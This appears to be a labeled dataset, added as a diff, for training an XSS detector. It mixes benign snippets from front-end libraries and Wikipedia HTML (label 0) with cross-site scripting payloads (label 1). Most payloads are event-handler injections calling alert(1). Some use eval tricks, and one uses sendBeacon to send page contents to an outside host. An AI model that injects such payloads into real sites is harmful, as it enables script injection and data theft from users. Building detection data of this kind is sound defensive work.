+"value: function init(els, options) { return _get(tabs.__proto__ || object.getprototypeof(tabs), ""init"", this).call(this, this, els, options); }",0
+this.el.m_sidenav = this,0
+"<listing onbeforepaste=""alert(1)"" contenteditable>test</listing>",1
+<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,1
+"<br onmousedown=""alert(1)"">test</br>",1
+"<li id=""cite_note-propublica.org-383""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-propublica.org_383-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-propublica.org_383-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-propublica.org_383-2""><sup><i><b>c </b> </i> </sup> </a>",0
+"<li id=""cite_note-bayesian_inference-206""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-bayesian_inference_206-0"">^ </a> </b>",0
+<image3 onpointerdown=alert(1)>xss</image3>,1
+"<param onkeydown=""alert(1)"" contenteditable>test</param>",1
+} _exit() { scrollspy._visibleelements = scrollspy._visibleelements.filter(function(value) {,0
+"<p>robot designer <a href=""/wiki/hans_moravec"" title=""hans moravec"">hans moravec </a>, cyberneticist <a href=""/wiki/kevin_warwick"" title=""kevin warwick"">kevin warwick </a> and inventor <a href=""/wiki/ray_kurzweil"" title=""ray kurzweil"">ray kurzweil </a> have predicted that humans and machines will merge in the future into <a href=""/wiki/cyborg"" title=""cyborg"">cyborgs </a> that are more capable and powerful than either.<sup id=""cite_ref-transhumanism_411-0"" class=""reference""><a href=""#cite_note-transhumanism-411"">&#91;399&#93; </a> </sup> this idea, called <a href=""/wiki/transhumanism"" title=""transhumanism"">transhumanism </a>, has roots in <a href=""/wiki/aldous_huxley"" title=""aldous huxley"">aldous huxley </a> and <a href=""/wiki/robert_ettinger"" title=""robert ettinger"">robert ettinger </a>.",0
+"this._element.classlist.add(class_name_collapsing); this._element.style[dimension] = 0; this._addariaandcollapsedclass(this._triggerarray, true);",0
+"<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></content>",1
+return domelem.m_taptarget; } destroy() {,0
+"} var comparator = isfunction(selector) ? selector : getcomparefunction(selector); return cash(filter.call(this, function (e) {",0
+"<h1 onmouseup=""alert(1)"">test</h1>",1
+"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://observer.com/2015/08/stephen-hawking-elon-musk-and-bill-gates-warn-about-artificial-intelligence/"">""stephen hawking, elon musk, and bill gates warn about artificial intelligence"" </a>. <i>observer </i>. 19 august 2015. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030053323/http://observer.com/2015/08/stephen-hawking-elon-musk-and-bill-gates-warn-about-artificial-intelligence/"">archived </a> from the original on 30 october 2015<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 october",0
+<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,1
+"<mark draggable=""true"" ondrag=""alert(1)"">test</mark>",1
+_this13._openingtrigger = undefined,0
+"<ul><li><a href=""/wiki/outline_of_robotics"" title=""outline of robotics"">outline </a> </li>",0
+clippingrect.x = clippingrect.left; clippingrect.y = clippingrect.top; return clippingrect;,0
+"<h3><span class=""mw-headline"" id=""sub-symbolic"">sub-symbolic",0
+"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",1
+"<script>throw onerror=eval,'alert\x281\x29'</script>",1
+"insertcontent(cash(parent), this); return this; },",0
+mathematical definitions of intelligence:,0
+} this.isopen = false; },0
+<body id=x tabindex=1 onfocusin=alert(1)></body>,1
+var parallaxdist = imgheight - containerheight,0
+<image src/onerror=alert(1)>,1
+} $('.github-commit') .find('.date'),0
+<base onpointerout=alert(1)>xss</base>,1
+toast.startingxpos = toast._xpos(e),0
+"function arevalidelements() { for (var _len = arguments.length, args = new array(_len), _key = 0; _key < _len; _key++) { args[_key] = arguments[_key];",0
+"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",1
+let matchingdata = [],0
+"this._updateitemstyle(el, centertweenedopacity, 0, transformstring)",0
+<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,1
+"<a href=""/wiki/game_theory"" title=""game theory"">game theory </a> and <a href=""/wiki/mechanism_design"" title=""mechanism design"">mechanism design </a>:",0
+"dropdown: root.queryselectorall('.dropdown-trigger:not(.no-autoinit)'),",0
+"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",1
+"<meter onmousemove=""alert(1)"">test</meter>",1
+<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,1
+const class_dropdown = 'dropdown'; const selector_dropdown_toggle = '.dropdown-toggle'; const selector_dropdown_menu = '.dropdown-menu';,0
+"callback.apply(this, arguments); removeevent(v, eventname, finalcallback); };",0
+this._width = this.el.getboundingclientrect().width; this._overlay.style.display = 'block'; this._initialscrolltop = this.isopen ? this.el.scrolltop : m.getdocumentscrolltop();,0
+"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",1
+"<template onmouseleave=""alert(1)"">test</template>",1
+const class_name_fade$3 = 'fade',0
+"instancemap.set(key, instance); }, get(element, key) {",0
+"m.textareaautoresize($(this)); }); $(document).on('change', '.file-field input[type=""file""]', function () {",0
+this._indicator.parentnode.removechild(this._indicator); if (this.options.swipeable) { this._teardownswipeabletabs();,0
+"<source onbeforecut=""alert(1)"" contenteditable>test</source>",1
+if (selector.cash && selector !== win) {,0
+super._typecheckconfig(config) this._checkcontent(config.content) },0
+} $(this.options.getactiveelement(scrollspy._visibleelements[0].attr('id'))).addclass( this.options.activeclass,0
+"<marquee onmousemove=""alert(1)"">test</marquee>",1
+"<p>much of traditional <a href=""/wiki/symbolic_artificial_intelligence"" title=""symbolic artificial intelligence"">gofai </a> got bogged down on <i>ad hoc </i> patches to <a href=""/wiki/symbolic_computation"" class=""mw-redirect"" title=""symbolic computation"">symbolic computation </a> that worked on their own toy models but failed to generalize to real-world results. however, around the 1990s, ai researchers adopted sophisticated mathematical tools, such as <a href=""/wiki/hidden_markov_model"" title=""hidden markov model"">hidden markov models </a> (hmm), <a href=""/wiki/information_theory"" title=""information theory"">information theory </a>, and normative bayesian <a href=""/wiki/decision_theory"" title=""decision theory"">decision theory </a> to compare or to unify competing architectures. the shared mathematical language permitted a high level of collaboration with more established fields (like <a href=""/wiki/mathematics"" title=""mathematics"">mathematics </a>, economics or <a href=""/wiki/operations_research"" title=""operations research"">operations research </a>).<sup id=""cite_ref-174"" class=""reference""><a href=""#cite_note-174"">&#91;d&#93; </a> </sup> compared with gofai, new ""statistical learning"" techniques such as hmm and neural networks were gaining higher levels of accuracy in many practical domains such as <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, without necessarily acquiring a semantic understanding of the datasets. the increased successes with real-world data led to increasing emphasis on comparing different approaches against shared test data to see which approach performed best in a broader context than that provided by idiosyncratic toy models; ai research was becoming more <a href=""/wiki/scientific_method"" title=""scientific method"">scientific </a>. nowadays results of experiments are often rigorously measurable, and are sometimes (with difficulty) reproducible.<sup id=""cite_ref-formal_methods_in_ai_43-1"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup><sup id=""cite_ref-175"" class=""reference""><a href=""#cite_note-175"">&#91;171&#93; </a> </sup> different statistical learning techniques have different limitations; for example, basic hmm cannot model the infinite possible combinations of natural language.<sup id=""cite_ref-footnotenorvig2012_176-0"" class=""reference""><a href=""#cite_note-footnotenorvig2012-176"">&#91;172&#93; </a> </sup> critics note that the shift from gofai to statistical learning is often also a shift away from <a href=""/wiki/explainable_ai"" class=""mw-redirect"" title=""explainable ai"">explainable ai </a>. in agi research, some scholars caution against over-reliance on statistical learning, and argue that continuing research into gofai will still be necessary to attain general intelligence.<sup id=""cite_ref-footnotelangley2011_177-0"" class=""reference""><a href=""#cite_note-footnotelangley2011-177"">&#91;173&#93; </a> </sup><sup id=""cite_ref-footnotekatz2012_178-0"" class=""reference""><a href=""#cite_note-footnotekatz2012-178"">&#91;174&#93; </a> </sup>",0
+"<li id=""cite_note-417""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-417"">^ </a> </b>",0
+arr.join('') + '</select>'; if ($.isarray(opts.yearrange)) {,0
+const event_keydown_dismiss = `keydown.dismiss${event_key}`; const event_click_data_api = `click${event_key}${data_api_key}`; const class_name_open = 'modal-open';,0
+this._buildhoursview(); this._buildminutesview(); this._buildsvgclock();,0
+"v.setattribute(name, value); } else { v[name] = value;",0
+"<pre draggable=""true"" ondrag=""alert(1)"">test</pre>",1
+if (node === getwindow(node) || !ishtmlelement(node)) { return getwindowscroll(node); } else {,0
+"<p>advancements in ai have contributed to the growth of the automotive industry through the creation and evolution of self-driving vehicles. as of 2016<sup class=""plainlinks noexcerpt noprint asof-tag update"" style=""display:none;""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=artificial_intelligence&amp;action=edit"">&#91;update&#93; </a> </sup>, there are over 30 companies utilizing ai into the creation of <a href=""/wiki/self-driving_car"" title=""self-driving car"">self-driving cars </a>. a few companies involved with ai include <a href=""/wiki/tesla_motors"" class=""mw-redirect"" title=""tesla motors"">tesla </a>, <a href=""/wiki/google"" title=""google"">google </a>, and <a href=""/wiki/apple_inc."" title=""apple inc."">apple </a>.<sup id=""cite_ref-307"" class=""reference""><a href=""#cite_note-307"">&#91;296&#93; </a> </sup>",0
+"var axis = getmainaxisfromplacement(baseplacement); var isvertical = [left, right].indexof(baseplacement) >= 0; var len = isvertical ? 'height' : 'width';",0
+"path_input[0].value = file_names.join(', ')",0
+"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>",1
+value: function _animateoverlayin() { var start = 0; if (this.isdragged) {,0
+"<ul oncopy=""alert(1)"" contenteditable>test</ul>",1
+if ( optionstoupdate[name] !== undefined ) { options[name] = newoptions[name]; },0
+"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",1
+"</span> <span class=""reference-text""><cite class=""citation web""><a href=""/wiki/graham_oppy"" title=""graham oppy"">graham oppy </a> (20 january 2015). <a rel=""nofollow"" class=""external text"" href=""http://plato.stanford.edu/entries/goedel-incompleteness/#gdeargagamec"">""gödel's incompleteness theorems"" </a>. <i><a href=""/wiki/stanford_encyclopedia_of_philosophy"" title=""stanford encyclopedia of philosophy"">stanford encyclopedia of philosophy </a> </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">27 april",0
+$(el).css({ display: 'none' }),0
+"<bdo onmousemove=""alert(1)"">test</bdo>",1
+"return } const toggle = (selector, classname) => {",0
+<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>,1
+<rp id=x tabindex=1 onfocusin=alert(1)></rp>,1
+function order(modifiers) {,0
+"<header onmouseenter=""alert(1)"">test</header>",1
+"var defaults = { 'connect': false, 'direction': 'ltr',",0
+"<time onkeypress=""alert(1)"" contenteditable>test</time>",1
+"this.filterquery = []; } }, {",0
+"var documentelement = getdocumentelement(offsetparent); var rect = getboundingclientrect(elementorvirtualelement, offsetparentisscaled, isfixed); var scroll = {",0
+"<li id=""cite_note-singularity-410""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-singularity_410-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-singularity_410-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-singularity_410-2""><sup><i><b>c </b> </i> </sup> </a>",0
+&#x00003c,1
+"<form onkeypress=""alert(1)"" contenteditable>test</form>",1
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/link-extractors.html"">link extractors</a></li>",0
+"} function testpadding ( parsed, entry ) { if ( !isnumeric(entry) ){",0
+value: function destroy() { this._removeeventhandlers(); this.el.taptarget = undefined;,0
+"<sup onkeydown=""alert(1)"" contenteditable>test</sup>",1
+.removeclass('invalid'); formreset.find(input_selector).each(function(e) { if (this.value.length) {,0
+this.$el.append(chipel); this.$chips.add(chipel); },0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/items.html"">items</a></li>",0
+"<big onmouseleave=""alert(1)"">test</big>",1
+const dimension = this._getdimension() this._element.classlist.remove(class_name_collapse) this._element.classlist.add(class_name_collapsing),0
+$('.datepicker').datepicker(); $('.tabs').tabs(); $('.timepicker').timepicker();,0
+"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" ontransitionend=alert(1)></ol>",1
+<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>,1
+focused.next().addclass('focused'); } },0
+.css({ opacity: 1 });,0
+"key: ""_isdate"", value: function _isdate(obj) { return (/date/.test(object.prototype.tostring.call(obj)) && !isnan(obj.gettime())",0
+"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",1
+</span></a></dt><dd>understand scrapy versioning and api stability.</dd>,0
+"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionend=alert(1)></canvas>",1
+"<data draggable=""true"" ondragleave=""alert(1)"">test</data>",1
+if (_this18.ancestorschanged.length) {,0
+"<style>@keyframes slidein {}</style><plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></plaintext>",1
+"https://portswigger-labs.net/xss/xss.php?x=%3cbody%20onload=%22throw%20onerror=eval,{linenumber:1,columnnumber:1,filename:1,message:%27/*%27%2blocation}%22%3e#*/alert(1)//",1
+"this.$slider.css('height', this.options.height + 'px'); } }",0
+"<details onmouseover=""alert(1)"">test</details>",1
+<abbr id=x tabindex=1 onactivate=alert(1)></abbr>,1
+"element.addeventlistener(eventname, method, false); methods.push([eventname, method]); });",0
+const innamespace = typeevent !== originaltypeevent; const events = getelementevents(element); const storeelementevent = events[typeevent] || {};,0
+"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;354–360, </li>",0
+"<menu onkeydown=""alert(1)"" contenteditable>test</menu>",1
+"left = m.getdocumentscrollleft(), right = left + window.innerwidth, bottom = top + window.innerheight;",0
+var file_field = $(this).closest('.file-field'); var path_input = file_field.find('input.file-path'); var files = $(this)[0].files;,0
+"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>",1
+<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>,1
+return this.chipsdata,0
+var baseplacement = getbaseplacement(preferredplacement); var isbaseplacement = baseplacement === preferredplacement; var fallbackplacements = specifiedfallbackplacements || (isbaseplacement || !flipvariations ? [getoppositeplacement(preferredplacement)] : getexpandedfallbackplacements(preferredplacement));,0
+"<div ondblclick=""alert(1)"">test</div>",1
+var to = scope_spectrum.getstep(proposal),0
+var touch = e.type.indexof('touch') === 0,0
+<wbr onpointerleave=alert(1)>xss</wbr>,1
+this['spanminutes'].innerhtml = timepicker._addleadingzero(value),0
+var href = result.ref.split('http://materializecss.com/')[1],0
+"<nobr draggable=""true"" ondragstart=""alert(1)"">test</nobr>",1
+return; } _this27._animateout();,0
+"} _applymanipulationcallback(selector, callback) { if (iselement(selector)) {",0
+"<area oncut=""alert(1)"" contenteditable>test</area>",1
+"} static getinstance(element) { return data.get(getelement(element), this.data_key);",0
+"})(this, (function (eventhandler, selectorengine, config) { 'use strict'",0
+"leftcallback: '(function|null)', rightcallback: '(function|null)' }",0
+"return (/(^#[0-9a-f]{6}$)|(^#[0-9a-f]{3}$)/i.test(a) ); }, rgb: function (a) {",0
+"key: ""_handlefocus"", value: function _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {",0
+const namespaceregex = /[^.]*(?=\..*)\.|.*/,0
+_handlefabclick() { if (this.isopen) { this.close();,0
+<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>,1
+element.dispatchevent(evt); } if (evt.defaultprevented && jqueryevent) {,0
+return function (prop) { prop = camelcase(prop); if (cache[prop]) {,0
+"_animatein() { $.extend(this.el.style, { display: 'block',",0
+<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,1
+"<figure draggable=""true"" ondrag=""alert(1)"">test</figure>",1
+value: function adjustcalendar(calendar) {,0
+"<h1 ondblclick=""alert(1)"">test</h1>",1
+"if (a = /([\+\-]?[0-9#\.]+)(%|px|pt|em|rem|in|cm|mm|ex|ch|pc|vw|vh|vmin|vmax|deg|rad|turn)?$/.exec(a)) return a[2]; }function v(a) { if (-1 < a.indexof(""translate"") || ""perspective"" === a) return ""px"";if (-1 < a.indexof(""rotate"") || -1 < a.indexof(""skew"")) return ""deg"";",0
+let toastelement = this._createtoast(); toastelement.m_toast = this; this.el = toastelement;,0
+"el.addeventlistener('click', _this63._handleindicatorclickbound); }); }",0
+hascontent() { return this.getcontent().length > 0 },0
+} this.destroyselects(); this.calendarel.innerhtml = html;,0
+"eventhandler.on(this._element, event_touchend, event => this._end(event)); } }",0
+toastelement.m_toast = this,0
+} m.taptarget = taptarget; if (m.jqueryloaded) {,0
+if (absdeltax <= swipe_threshold) { return },0
+<th onpointerover=alert(1)>xss</th>,1
+"import { definejqueryplugin, getnextactiveelement, isdisabled } from './util/index.js'",0
+const data_api_key$5 = '.data-api',0
+reference: 'toggle' }; const defaulttype = {,0
+if (mainaxis != null) {,0
+"<strong onpaste=""alert(1)"" contenteditable>test</strong>",1
+"<body oncontextmenu=""alert(1)"">test</body>",1
+$('ul#nav-mobile li.search .search-wrapper i.material-icons').click(function() {,0
+<button onpointerout=alert(1)>xss</button>,1
+"<param onmouseenter=""alert(1)"">test</param>",1
+} }; var touchhandler = {,0
+let referenceelement = this._element,0
+"}; document.body.nouilistener = f; document.body.addeventlistener('selectstart', f, false);",0
+if (!iselement(element) || element.getclientrects().length === 0) { return false },0
+<h1 id=x tabindex=1 onfocusin=alert(1)></h1>,1
+"if ( typeof entry !== 'string' ) { throw new error(""nouislider: 'behaviour' must be a string containing options.""); }",0
+"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",1
+"<label oncut=""alert(1)"" contenteditable>test</label>",1
+"function range(el, options) {",0
+"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" ontransitionend=alert(1)></h1>",1
+_handledocumentclickmove(e) {,0
+if (next.matches(selector)) { return [next]; },0
+"<dt><a class=""reference internal"" href=""topics/settings.html""><span class=""doc"">settings",0
+"window.removeeventlistener('resize', this._handlethrottledresizebound)",0
+"value: function init(els, options) { return _get(pushpin.__proto__ || object.getprototypeof(pushpin), ""init"", this).call(this, this, els, options); }",0
+<svg><noframes onload=alert(1)></noframes>,1
+"</span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://ishti.org/2018/11/19/using-artificial-intelligence-to-predict-flight-delays/"">using ai to predict flight delays </a>, ishti.org.",0
+"<tr onkeyup=""alert(1)"" contenteditable>test</tr>",1
+return; } parsed.padding = parsed.spectrum.getmargin(entry);,0
+"anim({ targets: this._overlay, opacity: 0,",0
+var domelem = !!el.jquery ? el[0] : el; return domelem.m_charactercounter; },0
+"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",1
+<style id=x tabindex=1 onactivate=alert(1)></style>,1
+"document.body.removeeventlistener('touchend', this._handledocumentclickbound); } }], [{",0
+element.uidevent = uid eventregistry[uid] = eventregistry[uid] || {} return eventregistry[uid],0
+<img src=javascript:alert('')>,1
+this._supportpointerevents = boolean(window.pointerevent) this._initevents() },0
+ripplestyle['transition-duration'] = effect.duration + 'ms',0
+"key: ""_removeeventhandlers"", value: function _removeeventhandlers() { if (scrollspy._count === 0) {",0
+prefix += math.floor(math.random() * max_uid); } while (document.getelementbyid(prefix)); return prefix;,0
+if (opts.isendrange) { arr.push('is-endrange'); },0
+import { definejqueryplugin } from './util/index.js' const name = 'alert' const data_key = 'bs.alert',0
+"</span> <span class=""reference-text""><cite class=""citation book"">daniel merkle; martin middendorf (2013). ""swarm intelligence"". in burke, edmund k.; kendall, graham (eds.). <i>search methodologies: introductory tutorials in optimization and decision support techniques </i>. springer science &amp; business media. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a>&#160;<a href=""/wiki/special:booksources/978-1-4614-6940-7"" title=""special:booksources/978-1-4614-6940-7""><bdi>978-1-4614-6940-7 </bdi> </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=bookitem&amp;rft.atitle=swarm+intelligence&amp;rft.btitle=search+methodologies%3a+introductory+tutorials+in+optimization+and+decision+support+techniques&amp;rft.pub=springer+science+%26+business+media&amp;rft.date=2013&amp;rft.isbn=978-1-4614-6940-7&amp;rft.au=daniel+merkle&amp;rft.au=martin+middendorf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
+"</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=latimes.com&amp;rft.atitle=impact+of+artificial+intelligence+on+banking&amp;rft.date=1990-01-17&amp;rft.aulast=christy&amp;rft.aufirst=charles+a.&amp;rft_id=https%3a%2f%2fwww.latimes.com%2farchives%2fla-xpm-1990-01-17-fi-233-story.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
+"setdataattribute(element, key, value) { element.setattribute(`data-bs-${normalizedatakey(key)}`, value) },",0
+"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",1
+"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, p.&#160;17, who write ""for the next 20 years the field would be dominated by these people and their students."" </li>",0
+"var idealypos = triggerbrect.top - dropdownbrect.top; var dropdownbounds = { left: idealxpos,",0
+return gethtmlelementscroll(node); } },0
+"var _defaults = {}; var charactercounter = function (_component17) { _inherits(charactercounter, _component17);",0
+"(function (global, factory) { typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('../util/index.js')) : typeof define === 'function' && define.amd ? define(['../util/index'], factory) :",0
+let dragdirection = totaldeltax > 0 ? 'right' : 'left',0
+"function getstep ( xpct, xsteps, snap, value ) {",0
+this._setupindicators(),0
+<hgroup onpointerout=alert(1)>xss</hgroup>,1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",1
+.siblings('label') .removeclass('active'); },0
+"<param ondblclick=""alert(1)"">test</param>",1
+"<small draggable=""true"" ondragend=""alert(1)"">test</small>",1
+let isfixed = this.$origin.css('position') === 'fixed',0
+"<li class=""toclevel-2 tocsection-21""><a href=""#sub-symbolic""><span class=""tocnumber"">5.3",0
+const getelement = object => { if (iselement(object)) { return object.jquery ? object[0] : object,0
+_this72._setupeventhandlers(); return _this72; },0
+"key: ""_animateinfab"", value: function _animateinfab() { var _this49 = this;",0
+} } _handlefabclick() {,0
+"<style>:target {transform: rotate(180deg);}</style><body id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></body>",1
+this._element.classlist.add(class_name_pointer_event),0
+"<img src = x onerror = ""javascript: window.onerror = alert; throw "">",1
+"<mark draggable=""true"" ondragend=""alert(1)"">test</mark>",1
+height: 0 }; var arrowpaddingobject = state.modifiersdata['arrow#persistent'] ? state.modifiersdata['arrow#persistent'].padding : getfreshsideobject();,0
+"<element onmousedown=""alert(1)"">test</element>",1
+"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
+"key: ""_removeeventhandlers"", value: function _removeeventhandlers() { document.removeeventlistener('scroll', pushpin._updateelements);",0
+var height = element.offsetheight,0
+"}, { key: ""_updateitemstyle"", value: function _updateitemstyle(el, opacity, zindex, transform) {",0
+<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>,1
+"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",1
+"<li><a href=""/wiki/mind%e2%80%93body_problem"" title=""mind–body problem"">mind–body problem </a>",0
+$(this.container).addclass('autocomplete-content dropdown-content'),0
+"}, 0); } this.istouchmoving = false;",0
+"this._gettipelement().setattribute('data-popper-placement', data.state.placement)",0
+<body onselectstart=alert(1)>select some text,1
+"easing: 'easeinoutcubic', complete: () => { $body.css({",0
+"} function addmarking ( spread, filterfunc, formatter ) { var element = document.createelement('div'),",0
+let percentscrolled = (windowbottom - top) / (containerheight + windowheight); let parallax = parallaxdist * percentscrolled; if (!this._enabled) {,0
+<spacer onpointermove=alert(1)>xss</spacer>,1
+"<acronym onmousedown=""alert(1)"">test</acronym>",1
+"}, { key: ""_setup"", value: function _setup() {",0
+this.activeindex = index; this.start(); },0
+<multicol onpointerover=alert(1)>xss</multicol>,1
+"<style>@keyframes slidein {}</style><dir style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dir>",1
+"<iframe name=""alert(1)"" src=""https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></iframe>",1
+"const hideevent = active ? eventhandler.trigger(active, event_hide, { relatedtarget: innerelem }) : null;",0
+"}) } this._queuecallback(complete, element, element.classlist.contains(class_name_fade))",0
+"<multicol onmouseup=""alert(1)"">test</multicol>",1
+"case left: offsets = { x: reference.x - element.width,",0
+<shadow onpointermove=alert(1)>xss</shadow>,1
+<cite id=x tabindex=1 onactivate=alert(1)></cite>,1
+<object id=x onfocus=alert(1) type=text/html>,1
+"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",1
+"<li onclick=""alert(1)"">test</li>",1
+let body = document.body; body.style.overflow = 'hidden'; },0
+}e = e[e.length - 1],0
+"<dfn onmouseover=""alert(1)"">test</dfn>",1
+<meta onpointermove=alert(1)>xss</meta>,1
+<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>,1
+"function getdata(node, key) { var c = getdatacache(node); if (c[key] === undefined) {",0
+"<dd ondblclick=""alert(1)"">test</dd>",1
+responsivethreshold: 0 // breakpoint for swipeable }; class parallax extends component {,0
+"<table oncut=""alert(1)"" contenteditable>test</table>",1
+"<svg onunload=navigator.sendbeacon('//ssl.portswigger-labs.net/',document.body.innerhtml)>",1
+"<command draggable=""true"" ondragleave=""alert(1)"">test</command>",1
+"document.getelementsbyname("""")",1
+"<base ondblclick=""alert(1)"">test</base>",1
+"<embed onmouseenter=""alert(1)"">test</embed>",1
+"</span> <span class=""reference-text""><cite class=""citation book"">ferguson, sarah; luders, brandon; grande, robert c.; how, jonathan p. (2015). <i>real-time predictive modeling and robust avoidance of pedestrians with uncertain, changing intentions </i>. <i>algorithmic foundations of robotics xi </i>. springer tracts in advanced robotics. <b>107 </b>. springer, cham. pp.&#160;161–177. <a href=""/wiki/arxiv"" title=""arxiv"">arxiv </a>:<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1405.5581"">1405.5581 </a>",0
+"<ins onmouseenter=""alert(1)"">test</ins>",1
+_handledocumentclick(e) { if (!$(e.target).closest(this.$menu).length) { this.close();,0
+$tabswrapper.remove(),0
+return query.substr(1),0
+const outerelem = this._getouterelement(element),0
+class autocomplete extends component {,0
+<progress id=x tabindex=1 onactivate=alert(1)></progress>,1
+"function floatingactionbutton(el, options) {",0
+"if (m.jqueryloaded) { m.initializejquerywrapper(charactercounter, 'charactercounter', 'm_charactercounter'); }",0
+this._handleoverlayclickbound = this._handleoverlayclick.bind(this); this._handlemodalcloseclickbound = this._handlemodalcloseclick.bind(this); if (modal._count === 1) {,0
+"<col onclick=""alert(1)"">test</col>",1
+"const outerelem = this._getouterelement(child); child.setattribute('aria-selected', isactive); if (outerelem !== child) {",0
+const class_name_collapsing = 'collapsing'; const class_name_collapsed = 'collapsed'; const class_name_deeper_children = `:scope .${class_name_collapse} .${class_name_collapse}`;,0
+<small onpointermove=alert(1)>xss</small>,1
+"<form draggable=""true"" ondragenter=""alert(1)"">test</form>",1
+this.$activetablink.removeclass('active'),0
+this.$input[0].value = ''; } else if ((e.keycode === 8 || e.keycode === 37) && this.$input[0].value === '' && this.chipsdata.length) { e.preventdefault();,0
+"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",1
+"<script src=""data:text/javascript,alert(1)""></script>",1
+<svg><dialog onload=alert(1)></dialog>,1
+definejqueryplugin(collapse); const name$a = 'dropdown'; const data_key$6 = 'bs.dropdown';,0
+"if (gpuacceleration) { var _object$assign; return object.assign({}, commonstyles, (_object$assign = {}, _object$assign[sidey] = hasy ? '0' : '', _object$assign[sidex] = hasx ? '0' : '', _object$assign.transform = (win.devicepixelratio || 1) <= 1 ? ""translate("" + x + ""px, "" + y + ""px)"" : ""translate3d("" + x + ""px, "" + y + ""px, 0)"", _object$assign));",0
+"<meter onmousedown=""alert(1)"">test</meter>",1
+"<li><a href=""#citerefnewquist1994"">newquist 1994 </a>, pp.&#160;189–201 </li> </ul>",0
+"return this[0][""client"" + v]; }; fn[""outer"" + v] = function (margins) {",0
+"<a href=""/wiki/search_algorithm"" title=""search algorithm"">search algorithms </a>:",0
+<b onpointerdown=alert(1)>xss</b>,1
+"pa = xpct[j-1]; pb = xpct[j]; return pa + (topercentage([va, vb], value) / subrangeratio (pa, pb));",0
+"<br onclick=""alert(1)"">test</br>",1
+"if (typeof config.reference === 'object' && !iselement$1(config.reference) && typeof config.reference.getboundingclientrect !== 'function') { throw new typeerror(`${name$a.touppercase()}: option ""reference"" provided type ""object"" without a required ""getboundingclientrect"" method.`); }",0
+<thead onpointerup=alert(1)>xss</thead>,1
+<nextid onpointermove=alert(1)>xss</nextid>,1
